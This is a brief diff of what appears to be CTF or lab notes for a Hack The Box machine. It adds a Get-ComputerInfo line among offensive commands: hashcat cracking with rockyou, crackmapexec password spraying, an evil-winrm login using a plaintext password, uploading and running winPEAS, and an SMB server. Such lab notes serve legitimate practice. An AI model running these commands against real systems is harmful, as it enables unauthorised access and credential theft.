@@ -31,6 +31,7 @@ hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
 crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
 crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
 evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
+Get-ComputerInfo
 upload winPEASx64.exe
 ./winPEASx64.exe
 ./smbserver.py s . -smb2support -username df -password df
